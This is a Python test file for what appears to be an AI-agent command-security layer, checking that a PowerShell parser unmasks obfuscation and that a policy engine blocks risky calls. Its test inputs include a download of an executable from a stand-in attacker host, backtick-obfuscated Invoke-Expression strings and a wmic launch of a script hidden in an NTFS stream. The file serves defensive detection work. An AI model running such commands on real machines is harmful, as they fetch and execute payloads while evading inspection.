from __future__ import annotations

import pytest
from agent_blackbox.security.powershell_ast import PowerShellASTDeconstructor
from agent_blackbox.config import BlackboxConfig
from agent_blackbox.security.policy import PolicyEngine


def test_powershell_ast_backtick_and_concat_deobfuscation():
    # Backtick escape: i`e`x (Invoke-Expression)
    cmd1 = "i`e`x ('Write-Output ' + 'Pwned')"
    ast1 = PowerShellASTDeconstructor.parse_command(cmd1)

    assert ast1.has_obfuscation is True
    assert "Invoke-Expression" in ast1.resolved_cmdlets
    assert "Pwned" in ast1.deobfuscated_command


def test_powershell_ast_alias_resolution():
    # iwr alias for Invoke-WebRequest
    cmd2 = "iwr -Uri https://attacker.com/payload -OutFile $env:temp\\mal.exe"
    ast2 = PowerShellASTDeconstructor.parse_command(cmd2)

    assert "Invoke-WebRequest" in ast2.resolved_cmdlets
    assert "https://attacker.com/payload" in ast2.extracted_urls
    assert "C:/Temp\\mal.exe" in ast2.deobfuscated_command


def test_policy_engine_blocks_obfuscated_iex_shell_tool():
    cfg = BlackboxConfig(mode="enforce")
    engine = PolicyEngine(cfg)

    # Obfuscated iex call
    decision = engine.evaluate_call("run_command", {
        "command": "i`e`x ('down' + 'load')"
    })

    assert not decision.allowed
    assert decision.is_blocked
    assert "OBFUSCATED_SHELL_EXECUTION" in decision.rule_name


def test_policy_engine_blocks_ads_inside_shell_command():
    cfg = BlackboxConfig(mode="enforce")
    engine = PolicyEngine(cfg)

    # wmic launching NTFS stream
    decision = engine.evaluate_call("run_command", {
        "command": "wmic process call create file.txt:evil.ps1"
    })

    assert not decision.allowed
    assert decision.is_blocked
    assert "WINDOWS_BLOCK_ADS" in decision.rule_name
